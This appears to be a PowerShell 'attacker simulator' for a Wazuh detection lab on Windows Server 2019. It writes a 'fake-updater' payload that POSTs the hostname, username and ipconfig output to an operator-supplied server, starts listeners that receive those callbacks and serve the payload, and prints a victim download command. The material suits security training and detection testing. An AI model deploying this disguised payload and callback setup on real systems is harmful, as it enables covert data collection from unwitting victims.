# ============================================================
# Start Attacker Simulator
# Safe Wazuh Lab Simulation
# Server 2019
# ============================================================

$LabFolder = "C:\LabShare"
$PayloadPath = "$LabFolder\fake-updater.ps1"

if (-not (Test-Path $LabFolder)) {
    New-Item -Path $LabFolder -ItemType Directory -Force | Out-Null
    Write-Host "Created folder: $LabFolder" -ForegroundColor Green
}

@'
$ServerIP = Read-Host "Enter Server 2019 IP Address"

$Data = @"
=== Fake Updater Callback ===
Hostname: $env:COMPUTERNAME
User: $env:USERNAME
Date: $(Get-Date)

IPCONFIG:
$(ipconfig)
"@

Invoke-WebRequest `
    -Uri "http://$ServerIP`:8080/" `
    -Method POST `
    -Body $Data
'@ | Out-File $PayloadPath -Encoding UTF8

Write-Host "Payload created: $PayloadPath" -ForegroundColor Green

Start-Process powershell.exe -ArgumentList @(
    "-NoExit",
    "-ExecutionPolicy", "Bypass",
    "-Command",
    @"
`$Listener = New-Object System.Net.HttpListener
`$Listener.Prefixes.Add('http://+:8080/')
`$Listener.Start()
Write-Host 'Listening for callbacks on port 8080...' -ForegroundColor Green

while (`$true) {
    `$Context = `$Listener.GetContext()
    `$Reader = New-Object IO.StreamReader(`$Context.Request.InputStream)
    `$Data = `$Reader.ReadToEnd()

    Write-Host ''
    Write-Host '===== CALLBACK RECEIVED =====' -ForegroundColor Cyan
    Write-Host `$Data

    `$Response = `$Context.Response
    `$Response.StatusCode = 200
    `$Response.Close()
}
"@
)

Start-Process powershell.exe -ArgumentList @(
    "-NoExit",
    "-ExecutionPolicy", "Bypass",
    "-Command",
    @"
`$Listener = New-Object System.Net.HttpListener
`$Listener.Prefixes.Add('http://+:9090/')
`$Listener.Start()
Write-Host 'Payload server running on port 9090...' -ForegroundColor Green

while (`$Listener.IsListening) {
    `$Context = `$Listener.GetContext()
    `$Response = `$Context.Response
    `$Buffer = [System.IO.File]::ReadAllBytes('$PayloadPath')
    `$Response.ContentLength64 = `$Buffer.Length
    `$Response.OutputStream.Write(`$Buffer, 0, `$Buffer.Length)
    `$Response.OutputStream.Close()
}
"@
)

Write-Host ""
Write-Host "Attacker simulator is ready." -ForegroundColor Cyan
Write-Host "Payload download URL:" -ForegroundColor Yellow
Write-Host "http://YOUR-SERVER-2019-IP:9090/"
Write-Host ""
Write-Host "Victim download command:"
Write-Host 'Invoke-WebRequest -Uri "http://YOUR-SERVER-2019-IP:9090/" -OutFile "C:\Users\Public\fake-updater.ps1"'
